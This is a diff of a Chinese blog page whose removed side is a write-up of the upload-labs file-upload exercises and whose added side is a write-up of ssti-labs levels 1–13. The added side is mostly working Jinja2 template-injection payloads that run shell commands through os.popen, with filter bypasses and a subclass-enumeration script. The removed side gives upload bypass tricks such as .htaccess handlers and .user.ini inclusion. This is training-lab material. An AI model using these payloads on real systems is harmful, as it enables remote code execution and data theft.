@@ -24,7 +24,7 @@
 
   
 
-  <title>upload-labs | 逃离失眠</title>
+  <title>ssti-labs | 逃离失眠</title>
 
   
 
@@ -101,16 +101,16 @@
     <div class="header-content">
       <div class="post-text layout-block">
         <div class="layout-margin">
-          <h1 class="title-wrap">upload-labs</h1>
+          <h1 class="title-wrap">ssti-labs</h1>
           <h2 class="title-sub-wrap">
             <strong>Ins0mn1a93</strong>
             <span>发布于</span>
-            <time  class="article-date" datetime="2024-10-23T11:26:10.000Z" itemprop="datePublished">2024-10-23</time>
+            <time  class="article-date" datetime="2024-10-31T08:27:46.000Z" itemprop="datePublished">2024-10-31</time>
           </h2>
           
             <h2 class="last-time">
               <span>最后更新于</span>
-              <time  class="article-updated" datetime="2024-11-29T00:26:07.000Z" itemprop="dateUpdated">2024-11-29</time>
+              <time  class="article-updated" datetime="2024-12-06T03:23:38.221Z" itemprop="dateUpdated">2024-12-06</time>
             </h2>
           
           
@@ -141,64 +141,80 @@
       
       
       <section class="article-entry markdown-body layout-margin content-padding--large soft-size--large soft-style--box">
-        <h1>从upload-labs学文件上传</h1>
-<p>进度呢都是根据upload-labs来的，当然如果在真实渗透中也有遇到这种题目并且有另外的思路也拿过来说说（我电脑不知道怎么肥事，怎么连本地的文件上传的包都抓不了，过于抽象，只能用用NSSCTF平台来做做了）</p>
-<h2 id="less-1"><a class="header-anchor" href="#less-1">¶</a>less-1</h2>
-<p>前端无效检测后缀绕过，抓包修改后缀；或者禁用js就行，因为上传文件的逻辑是写在后端的，所以不必担心上传功能被ban</p>
-<h2 id="less-2"><a class="header-anchor" href="#less-2">¶</a>less-2</h2>
-<p>mime+前端后缀检测，跟上题一样，只要注意mime类型就行</p>
-<h2 id="less-3"><a class="header-anchor" href="#less-3">¶</a>less-3</h2>
-<p>过滤了 <code>.jsp</code>，<code>.jspx </code>，<code>.php</code>，用php3、phtml绕过就行，但不知道为什么解析不了</p>
-<p>在网上搜了搜，推测可能是php的配置文件并不支持解析php3，phtml等文件，这里指的应该是<code>.htaccess</code>文件（apache的）</p>
-<h2 id="less-4"><a class="header-anchor" href="#less-4">¶</a>less-4</h2>
-<p>这里把php以及其他能够解析成php文件的后缀给过滤掉了，由于系统用的是黑名单，所以可以尝试上传<code>.htaccess</code>文件，写入：</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AddHandler application/x-httpd-php .jpg</span><br></pre></td></tr></table></figure>
-<p>意为将<code>.jpg</code>当做php文件进行解析处理，解析之后发现还真行</p>
-<p><img src="image-20241023202054901.png" alt="image-20241023202054901"></p>
-<h2 id="less-5"><a class="header-anchor" href="#less-5">¶</a>less-5</h2>
-<p>过滤了<code>.htaccess</code>，那也许就是用<code>.user.ini</code>文件了（但是不行，看下文笔记），传一个</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">auto_prepend_file=<span class="string">&quot;1.jpg&quot;</span></span><br><span class="line">auto_append_file=<span class="string">&quot;1.jpg&quot;</span></span><br></pre></td></tr></table></figure>
-<p>这俩的区别在于执行的先后，<code>auto_prepend_file</code>在php执行前就会被包含，一般用于初始化；<code>auto_append_file</code>则用于php执行结束之后，一般用于善后。</p>
-<p>当然了，这题还有一种绕过就是大小写绕过，有点抽象了，前几题都有<code>$file_ext = strtolower($file_ext);</code>，但这题就不知道跑哪去了</p>
+        <h1>Level 1</h1>
+<p>正常弄，一把梭</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;().__class__&#125;&#125; # 查看类</span><br><span class="line">&#123;&#123;().__class__.__mro__[1]&#125;&#125; # 用 object 类</span><br><span class="line">&#123;&#123;().__class__.__mro__[1].__subclasses__()[133]&#125;&#125; # 用到子类os.wrap_close</span><br><span class="line">&#123;&#123;().__class__.__mro__[1].__subclasses__()[133].__init__.__globals__&#125;&#125; # 查看该子类的全局命名空间</span><br><span class="line">&#123;&#123;().__class__.__bases__[0].__subclasses__()[133].__init__.__globals__[&#x27;popen&#x27;](&#x27;ls&#x27;).read()&#125;&#125; # 用popen执行命令</span><br></pre></td></tr></table></figure>
+<p>附上子类下标显示代码：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> html</span><br><span class="line"><span class="keyword">from</span> bs4 <span class="keyword">import</span> BeautifulSoup</span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;http://node5.anna.nssctf.cn:20542/level/1&#x27;</span></span><br><span class="line">data = &#123;</span><br><span class="line">    <span class="string">&#x27;code&#x27;</span>: <span class="string">&#x27;&#123;&#123;().__class__.__mro__[1].__subclasses__()&#125;&#125;&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line">response = requests.post(url,data=data)</span><br><span class="line"></span><br><span class="line">i = <span class="number">0</span></span><br><span class="line">decoded_text = html.unescape(response.text)</span><br><span class="line">class_names = re.findall(<span class="string">r&quot;&lt;class &#x27;([^&#x27;]+?)&#x27;&gt;&quot;</span>, decoded_text)</span><br><span class="line"><span class="keyword">for</span> _, class_name <span class="keyword">in</span> <span class="built_in">enumerate</span>(class_names):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;i&#125;</span>: <span class="subst">&#123;class_name&#125;</span>&quot;</span>)</span><br><span class="line">    i = i + <span class="number">1</span></span><br></pre></td></tr></table></figure>
+<h1>Level 2</h1>
+<p>过滤了<code>&#123;&#123;&#125;&#125;</code>，那么就考虑<code>&#123;%`绕过。`&#123;%%&#125;</code>中的语句会直接执行，不会回显，所以需要用到像print函数等来进行输出</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;% print(&#x27;&#x27;.__class__.__bases__[0].__subclasses__()[133].__init__.__globals__[&#x27;popen&#x27;](&#x27;ls&#x27;).read()) %&#125;</span><br></pre></td></tr></table></figure>
+<p>步骤跟上面差不多</p>
+<h1>Level 3</h1>
+<p>这里没有过滤器，但是没有回显，可以考虑将命令输出结果写入到一个文件中。</p>
+<p>在flask中，一般情况下会将相关文件放到<code>/app</code>中，静态文件是放在<code>/static</code>下面的。</p>
+<p>不过有一个点没搞懂，为什么<code>ls</code>后输出的是根目录的信息呢？难道说它把工作目录设置到了根目录了？</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;lipsum.__globals__[&#x27;os&#x27;].popen(&#x27;echo `cat /app/flag` &gt;/app/static/7.txt&#x27;).read()&#125;&#125;</span><br></pre></td></tr></table></figure>
+<h1>Level 4</h1>
+<p>过滤了<code>[</code>和<code>]</code>，可以利用<code>getitem</code>进行绕过</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;().__class__&#125;&#125; # 查看类</span><br><span class="line">&#123;&#123;().__class__.__mro__.__getitem__(1)&#125;&#125; # 用 object 类</span><br><span class="line">&#123;&#123;().__class__.__mro__.__getitem__(1).__subclasses__().__getitem__(133)&#125;&#125; # 用到子类os.wrap_close</span><br><span class="line">&#123;&#123;().__class__.__mro__.__getitem__(1).__subclasses__().__getitem__(133).__init__.__globals__&#125;&#125; # 查看该子类的全局命名空间</span><br><span class="line">&#123;&#123;().__class__.__mro__.__getitem__(1).__subclasses__().__getitem__(133).__init__.__globals__.__getitem__(&#x27;popen&#x27;)(&#x27;ls&#x27;).read()&#125;&#125; # 用popen执行命令</span><br></pre></td></tr></table></figure>
+<h1>Level 5</h1>
+<p>过滤了<code>‘</code>和<code>“</code>，可以考虑用get传参绕过</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;().__class__.__bases__[0].__subclasses__()[133].__init__.__globals__[request.args.payload1](request.args.payload2).read()&#125;&#125;</span><br><span class="line"></span><br><span class="line">payload: url/level/5?payload1=popen&amp;payload2=ls</span><br></pre></td></tr></table></figure>
+<h1>Level 6</h1>
+<p>过滤了下划线，可以考虑用进制绕过</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;&#x27;&#x27;[&quot;\x5f\x5fclass\x5f\x5f&quot;][&quot;\x5f\x5fbases\x5f\x5f&quot;][0][&quot;\x5f\x5fsubclasses\x5f\x5f&quot;]()[133][&quot;\x5f\x5finit\x5f\x5f&quot;][&quot;\x5f\x5fglobals\x5f\x5f&quot;][&#x27;popen&#x27;](&#x27;ls&#x27;).read()&#125;&#125;</span><br></pre></td></tr></table></figure>
+<h1>Level 7</h1>
+<p>过滤了<code>.</code>，可以照搬Level6</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;&#x27;&#x27;[&quot;__class__&quot;][&quot;__bases__&quot;][0][&quot;__subclasses__&quot;]()[133][&quot;__init__&quot;][&quot;__globals__&quot;][&#x27;popen&#x27;](&#x27;ls&#x27;).read()&#125;&#125;</span><br></pre></td></tr></table></figure>
+<h1>Level 8</h1>
+<p>过滤了很多可用的字符串，考虑拼接绕过，也可以从Level6，Leve7搬过来</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;&#x27;&#x27;[&quot;__cl&quot;&quot;ass__&quot;][&quot;__bas&quot;&quot;es__&quot;][0][&quot;__subcla&quot;&quot;sses__&quot;]()[133][&quot;__in&quot;&quot;it__&quot;][&quot;__glo&quot;&quot;bals__&quot;][&#x27;po&#x27;&#x27;pen&#x27;](&#x27;l&#x27;&#x27;s&#x27;).read()&#125;&#125;</span><br></pre></td></tr></table></figure>
+<h1>Level 9</h1>
+<p>过滤了数字，考虑使用内置模版函数或者内置模板变量直接执行命令</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;g.pop.__globals__.__builtins__[&#x27;__import__&#x27;](&#x27;os&#x27;).popen(&#x27;ls&#x27;).read()&#125;&#125;</span><br><span class="line"></span><br><span class="line"># 像g.pop的内置模板函数还有url_for,get_flashed_messages,cycler,joiner</span><br><span class="line"># 内置模板变量有application,config,lipsum,self,namespace</span><br></pre></td></tr></table></figure>
+<h1>Level 10</h1>
+<p>这会儿是把config设为None，表示禁止对config进行访问，而这题的目标又是让我们得到config的信息</p>
+<p>直接访问config的情况：</p>
+<p><img src="image-20241104160558093.png" alt="image-20241104160558093"></p>
+<p><img src="image-20241104160615403.png" alt="image-20241104160615403"></p>
+<p>利用内置函数或变量来访问current_app</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;g.pop.__globals__[&#x27;current_app&#x27;].config&#125;&#125;</span><br></pre></td></tr></table></figure>
+<h1>Level 11</h1>
+<p>过滤了<code>’</code>，<code>“</code>，<code>+</code>，<code>request</code>，<code>.</code>，<code>[</code>，<code>]</code>，那只能另辟蹊径，用<code>&#123;%set %&#125;</code>绕过去，用attr来获取属性，getattr来获取下标；</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">目标payload：&#123;&#123;().__class__.__mro__.__getitem__(1).__subclasses__().__getitem__(133).__init__.__globals__.__getitem__(&#x27;popen&#x27;)(&#x27;ls&#x27;).read()&#125;&#125;</span><br><span class="line">&#123;%set a=dict(__cla=a,ss__=b)|join %&#125;  # __class__</span><br><span class="line">&#123;%set b=dict(__mr=a,o__=b)|join %&#125;  # __mro__</span><br><span class="line">&#123;%set c=dict(__subcla=a,sses__=b)|join %&#125;   # __subclasses__</span><br><span class="line">&#123;%set d=dict(__ge=a,titem__=a)|join%&#125; # __getitem__</span><br><span class="line">&#123;%set e=dict(__in=a,it__=b)|join %&#125; # __init__</span><br><span class="line">&#123;%set f=dict(__glo=a,bals__=b)|join %&#125; # __globals__</span><br><span class="line">&#123;%set g=dict(pop=a,en=b)|join %&#125; # popen</span><br><span class="line">&#123;%set h=dict(l=a,s=a)|join %&#125; # ls</span><br><span class="line">&#123;%set i=dict(re=a,ad=a)|join %&#125; # read</span><br><span class="line">&#123;&#123;&#x27;&#x27;|attr(a)|attr(b)|attr(d)(1)|attr(c)|attr(d)(133)|attr(e)|attr(f)|attr(d)(g)(h)|attr(i)()&#125;&#125;</span><br><span class="line">&#123;%set a=dict(__cla=a,ss__=b)|join %&#125;&#123;%set b=dict(__mr=a,o__=b)|join %&#125;&#123;%set c=dict(__subcla=a,sses__=b)|join %&#125;&#123;%set d=dict(__ge=a,titem__=a)|join%&#125;&#123;%set e=dict(__in=a,it__=b)|join %&#125;&#123;%set f=dict(__glo=a,bals__=b)|join %&#125;&#123;%set g=dict(pop=a,en=b)|join %&#125;&#123;%set h=dict(l=a,s=a)|join %&#125;&#123;%set i=dict(re=a,ad=a)|join %&#125;&#123;&#123;()|attr(a)|attr(b)|attr(d)(1)|attr(c)()|attr(d)(133)|attr(e)|attr(f)|attr(d)(g)(h)|attr(i)()&#125;&#125;</span><br><span class="line"></span><br><span class="line">目标payload2：&#123;&#123;().__class__.__mro__.__getitem__(1).__subclasses__().__getitem__(133).__init__.__globals__.__getitem__(&#x27;popen&#x27;)(&#x27;cat /app/flag&#x27;).read()&#125;&#125;</span><br><span class="line"># 构造空格</span><br><span class="line">&#123;%set space=lipsum|string|list|attr(d)(9)%&#125;</span><br><span class="line">&#123;&#123;space&#125;&#125;</span><br><span class="line">&#123;%set cmd = (dict(cat=a)|join,space,dict(flag=a)|join)|join%&#125;</span><br><span class="line"></span><br><span class="line"># 最终payload</span><br><span class="line">&#123;%set a=dict(__cla=a,ss__=b)|join %&#125;&#123;%set b=dict(__mr=a,o__=b)|join %&#125;&#123;%set c=dict(__subcla=a,sses__=b)|join %&#125;&#123;%set d=dict(__ge=a,titem__=a)|join%&#125;&#123;%set e=dict(__in=a,it__=b)|join %&#125;&#123;%set f=dict(__glo=a,bals__=b)|join %&#125;&#123;%set g=dict(pop=a,en=b)|join %&#125;&#123;%set h=dict(l=a,s=a)|join %&#125;&#123;%set i=dict(re=a,ad=a)|join %&#125;&#123;%set space=lipsum|string|list|attr(d)(9)%&#125;&#123;%set cmd = (dict(cat=a)|join,space,dict(flag=a)|join)|join%&#125;&#123;&#123;()|attr(a)|attr(b)|attr(d)(1)|attr(c)()|attr(d)(133)|attr(e)|attr(f)|attr(d)(g)(cmd)|attr(i)()&#125;&#125;</span><br></pre></td></tr></table></figure>
+<h1>Level 12</h1>
+<p>过滤了<code>_</code>，<code>.</code>，<code>0-9</code>，<code>\</code>，<code>‘</code>，<code>“</code>，<code>[</code>，<code>]</code>，可以考虑用count绕过，下划线依旧是通过构造来绕过</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">&#123;% set pop=dict(po=a,p=a)|join%&#125; # 构造 pop</span><br><span class="line">&#123;%set twentyfour=dict(aaaaaaaaaaaaaaaaaaaaaaaa=a)|join|count%&#125; # 构造24</span><br><span class="line">&#123;% set x=(()|select|string|list)|attr(pop)(twentyfour)%&#125; # 构造下划线</span><br><span class="line">&#123;%set hundred=dict(aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa=a)|join|count%&#125; # 构造133</span><br><span class="line">&#123;%set one=dict(a=a)|join|count%&#125; # 构造1</span><br><span class="line">&#123;%set nine=dict(aaaaaaaaa=a)|join|count%&#125; # 构造9</span><br><span class="line">&#123;%set space=lipsum|string|list|attr(d)(nine)%&#125; # 构造空格</span><br><span class="line">&#123;&#123;space&#125;&#125;</span><br><span class="line">&#123;%set cmd = (dict(cat=a)|join,space,dict(flag=a)|join)|join%&#125;</span><br><span class="line"></span><br><span class="line">&#123;%set a=(x,x,dict(class=a)|join,x,x)|join %&#125;  # __class__</span><br><span class="line">&#123;%set b=(x,x,dict(mro=a)|join,x,x)|join %&#125; # __mro__</span><br><span class="line">&#123;%set c=(x,x,dict(subclasses=a)|join,x,x)|join %&#125;  # __subclasses__</span><br><span class="line">&#123;%set d=(x,x,dict(getitem=a)|join,x,x)|join %&#125; # __getitem__</span><br><span class="line">&#123;%set e=(x,x,dict(init=a)|join,x,x)|join %&#125; # __init__</span><br><span class="line">&#123;%set f=(x,x,dict(globals=a)|join,x,x)|join %&#125; # __globals__</span><br><span class="line">&#123;%set g=dict(popen=a)|join %&#125; # popen</span><br><span class="line">&#123;%set h=dict(ls=a)|join%&#125; # ls</span><br><span class="line">&#123;%set i=dict(read=a)|join %&#125; # read</span><br><span class="line"></span><br><span class="line">&#123;%set a=(x,x,dict(class=a)|join,x,x)|join %&#125;&#123;%set b=(x,x,dict(mro=a)|join,x,x)|join %&#125;&#123;%set c=(x,x,dict(subclasses=a)|join,x,x)|join %&#125;&#123;%set d=(x,x,dict(getitem=a)|join,x,x)|join %&#125;&#123;%set e=(x,x,dict(init=a)|join,x,x)|join %&#125;&#123;%set f=(x,x,dict(globals=a)|join,x,x)|join %&#125;&#123;%set g=dict(popen=a)|join %&#125;&#123;%set h=dict(ls=a)|join%&#125;&#123;%set i=dict(read=a)|join %&#125;&#123;&#123;()|attr(a)|attr(b)|attr(d)(one)|attr(c)()|attr(d)(hundred)|attr(e)|attr(f)|attr(d)(g)(h)|attr(i)()&#125;&#125; # ls</span><br><span class="line"></span><br><span class="line">&#123;%set a=(x,x,dict(class=a)|join,x,x)|join %&#125;&#123;%set b=(x,x,dict(mro=a)|join,x,x)|join %&#125;&#123;%set c=(x,x,dict(subclasses=a)|join,x,x)|join %&#125;&#123;%set d=(x,x,dict(getitem=a)|join,x,x)|join %&#125;&#123;%set space=lipsum|string|list|attr(d)(nine)%&#125;&#123;%set cmd = (dict(cat=a)|join,space,dict(flag=a)|join)|join%&#125;&#123;%set e=(x,x,dict(init=a)|join,x,x)|join %&#125;&#123;%set f=(x,x,dict(globals=a)|join,x,x)|join %&#125;&#123;%set g=dict(popen=a)|join %&#125;&#123;%set h=dict(ls=a)|join%&#125;&#123;%set i=dict(read=a)|join %&#125;&#123;%set nine=dict(aaaaaaaaa=a)|join|count%&#125;&#123;%set space=lipsum|string|list|attr(d)(nine)%&#125;&#123;%set cmd = (dict(cat=a)|join,space,dict(flag=a)|join)|join%&#125;&#123;&#123;()|attr(a)|attr(b)|attr(d)(one)|attr(c)()|attr(d)(hundred)|attr(e)|attr(f)|attr(d)(g)(cmd)|attr(i)()&#125;&#125; # cat flag</span><br></pre></td></tr></table></figure>
+<p>这里最后写乱的原因是因为构造空格的时候需要用到getitem，但是在第一个payload中，getitem的构造在空格构造的后面，所以会出现No this level的现象</p>
+<h1>Level 13</h1>
+<p>过滤了<code>_</code>，<code>.</code>，<code>\</code>，<code>‘</code>，<code>“</code>，<code>[</code>，<code>]</code>，<code>+</code>，<code>request</code>，<code>class</code>，<code>init</code>，<code>arg</code>，<code>config</code>，<code>app</code>，<code>self</code></p>
+<p>拼接绕过就行，不赘述了</p>
+<h1>一些问题</h1>
+<ol>
+<li>在Level6和Level7中，引号和括号在表示基类时大有不同</li>
+</ol>
 <blockquote>
-<p>[!NOTE]</p>
-<p>说一句，这里不能用.user.ini，因为这题把小写去掉之后那个该死的<code>$img_path = UPLOAD_PATH.'/'.date(&quot;YmdHis&quot;).rand(1000,9999).$file_ext;</code>又来了，而<code> $file_ext</code>的赋值是<code>strrchr($file_name, '.')</code>，这个意思就是从<code>$file_name</code>找到最后一个出现<code>.</code>的，并返回其最后的部分字符串，所以.ini前面一定会被替换成随机的名字</p>
-<p><img src="image-20241023203827891.png" alt="image-20241023203827891"></p>
-<p>网上能直接上传过去的我猜应该是把<code>$img_path</code>写成这样了：<code>$img_path = UPLOAD_PATH.'/'.$file_name;</code>，所以你在上传成功之后会发现不会改文件名</p>
-<p>不过看下来有的第五关跟咱的不一样，估计是在源代码上做了点手脚，所以会导致有的wp不能拿过来用的情况</p>
+<p>字符串类型：</p>
+<p><img src="image-20241104153320444.png" alt="image-20241104153320444"></p>
+<p>元组类型：</p>
+<p><img src="image-20241104153428370.png" alt="image-20241104153428370"></p>
+<p>可以看到，字符串类型可以正常返回基组，但是元组却把它当做里面的元素来进行处理了</p>
+<p>其他类型：字典和列表</p>
+<p><img src="image-20241104153921876.png" alt="image-20241104153921876"></p>
+<p><img src="image-20241104153942002.png" alt="image-20241104153942002"></p>
+<p>同样也被当做元素来进行处理了，不知道为什么</p>
 </blockquote>
-<p><img src="image-20241023205634608.png" alt="image-20241023205634608"></p>
-<p>这里没有成功解析也是跟上面的第三关一样的，可能是配置文件没有写入相关后缀导致其不能够将其解析为php文件</p>
-<h2 id="less-6"><a class="header-anchor" href="#less-6">¶</a>less-6</h2>
-<p>这题有点小意思的，绕过黑名单时可以用空格来进行绕过，即<code>1.php</code> -&gt; <code>1. php</code>，不过还是不能解析成php文件，草</p>
-<p>这里似乎涉及到windows和linux的命名规则，它们在遇到带有空格的文件时会自动将空格去掉（wp如是说）</p>
-<p>但是在经过查资料和拷打gpt后，发现Linux和Windows对空格似乎不是那么重视呢，它是允许空格的存在的，在命令行中也不会对空格进行过滤，无非就是加个引号或者转义符来防止预期文件名和命令输入冲突</p>
-<p><img src="image-20241023212142646.png" alt="image-20241023212142646"></p>
-<h2 id="less-7"><a class="header-anchor" href="#less-7">¶</a>less-7</h2>
-<p>这会儿应该就是可以用<code>.user.ini</code>了，根据<code>$img_path = UPLOAD_PATH.'/'.$file_name;</code>可知，他改回来辣！这下不用复制粘贴了，直接跑到upload找🐴去！​</p>
-<h2 id="less-8"><a class="header-anchor" href="#less-8">¶</a>less-8</h2>
-<p>相较于前几题来说少了一个去除<code>::$DATA</code>动作，根据wp所说，<code>::$DATA</code>是一个替代数据流，根据windows文件系统特性，它在命名文件的时候是不允许包含<code>\ / : * ? “ &lt; &gt; |</code>的，当有文件上传到windows系统时，windows会自动处理这些符号。</p>
-<p><img src="image-20241024164847506.png" alt="image-20241024164847506"></p>
-<p>但值得注意的是，windows是允许空格符存在的，所以在对这些符号进行处理时，windows会自动将其转换为Tab键的输出效果或者一个空格；对于Linux文件系统来说，它是允许<code>:</code>存在的，所以在进行文件上传的时候需要注意一下操作系统。至于其他符号的话呢，它们在Linux各有各的用处，<code>/</code>是用来区分目录和文件的，<code>\</code>一般来说是起着连接作用的，所以你会发现<code>touch 1\2</code>后文件名会变成<code>12</code>…………不多说了</p>
-<p>反正我猜这个容器用的是Linux，不然怎么可能不会去掉<code>:</code>呢。</p>
-<p>这里我也抛出一个疑问：既然windows在命名文件和目录时不允许上述符号的存在，那为什么要用到替代数据流呢？难道是因为<code>$DATA</code>在命令行中被识别为环境变量了？我直接用<code>:</code>不就行了？（虽然有点前言不搭后语）</p>
-<h2 id="less-9"><a class="header-anchor" href="#less-9">¶</a>less-9</h2>
-<p>这题就是在后缀加一个<code>. .</code>就能够上传成功，但是由于系统的诟病，没法直接看到文件是否解析成功</p>
-<h2 id="less-10"><a class="header-anchor" href="#less-10">¶</a>less-10</h2>
-<p>这里做了一定修改，其中文件名称的处理逻辑改为<code>$file_name = str_ireplace($deny_ext,&quot;&quot;, $file_name);</code>那这个就很好理解了，将含有黑名单的部分替换成空，直接双拼绕过即可（双拼的时候注意位置就行）</p>
-<p><img src="image-20241024205739682.png" alt="image-20241024205739682"></p>
-<p><img src="image-20241024205731270.png" alt="image-20241024205731270"></p>
-<h2 id="less-11"><a class="header-anchor" href="#less-11">¶</a>less-11</h2>
-<p>这里开始用到白名单了，利用截断绕过即可。不过这里文件路径动了些小手脚：<code>$img_path = $_GET['save_path'].&quot;/&quot;.rand(10, 99).date(&quot;YmdHis&quot;).&quot;.&quot;.$file_ext;</code>，发现save_path是需要我们传上去的，这里用目录穿越到upload即可</p>
-<p>他喵的，这服务器没识别到%00我也是醉了，本地和容器都是一个样，他肯定把<code>1.php%00</code>看成一个目录了草，wp应该是这样的</p>
-<p><img src="image-20241024211732815.png" alt="image-20241024211732815"></p>
-<p>后续我又返回去看了看，NSS的upload-labs用的是5.5.9，但是截断漏洞要求是小于5.3.4（草）</p>
-<h2 id="less-12"><a class="header-anchor" href="#less-12">¶</a>less-12</h2>
-<p>跟11题一个样</p>
-<h2 id="less-13"><a class="header-anchor" href="#less-13">¶</a>less-13</h2>
-<p>这里就是文件头检测了，具体代码如下：</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getReailFileType</span>(<span class="params"><span class="variable">$filename</span></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$file</span> = <span class="title function_ invoke__">fopen</span>(<span class="variable">$filename</span>, <span class="string">&quot;rb&quot;</span>);</span><br><span class="line">    <span class="variable">$bin</span> = <span class="title function_ invoke__">fread</span>(<span class="variable">$file</span>, <span class="number">2</span>); <span class="comment">//只读2字节</span></span><br><span class="line">    <span class="title function_ invoke__">fclose</span>(<span class="variable">$file</span>);</span><br><span class="line">    <span class="variable">$strInfo</span> = @<span class="title function_ invoke__">unpack</span>(<span class="string">&quot;C2chars&quot;</span>, <span class="variable">$bin</span>);    </span><br><span class="line">    <span class="variable">$typeCode</span> = <span class="title function_ invoke__">intval</span>(<span class="variable">$strInfo</span>[<span class="string">&#x27;chars1&#x27;</span>].<span class="variable">$strInfo</span>[<span class="string">&#x27;chars2&#x27;</span>]);    </span><br><span class="line">    <span class="variable">$fileType</span> = <span class="string">&#x27;&#x27;</span>;    </span><br><span class="line">    <span class="keyword">switch</span>(<span class="variable">$typeCode</span>)&#123;      </span><br><span class="line">        <span class="keyword">case</span> <span class="number">255216</span>:            </span><br><span class="line">            <span class="variable">$fileType</span> = <span class="string">&#x27;jpg&#x27;</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">13780</span>:            </span><br><span class="line">            <span class="variable">$fileType</span> = <span class="string">&#x27;png&#x27;</span>;</span><br><span class="line">            <span class="keyword">break</span>;        </span><br><span class="line">        <span class="keyword">case</span> <span class="number">7173</span>:            </span><br><span class="line">            <span class="variable">$fileType</span> = <span class="string">&#x27;gif&#x27;</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">default</span>:            </span><br><span class="line">            <span class="variable">$fileType</span> = <span class="string">&#x27;unknown&#x27;</span>;</span><br><span class="line">        &#125;    </span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$fileType</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p>这里不再写labs了，有点缺陷，后续放在ctfshow了。</p>
+<ol start="2">
+<li>level11的构造空格时，payload为<code>&#123;%set space=lipsum|string|list|attr(‘pop’)(9)%&#125;</code>，在更改数字时会显示不同的字符，也并不是按照正常的ascii码表的顺序显示的</li>
+</ol>
+<blockquote>
+<p>其实你把它放到模板引擎看一下就知道了</p>
+<p><img src="image-20241104203423008.png" alt="image-20241104203423008"></p>
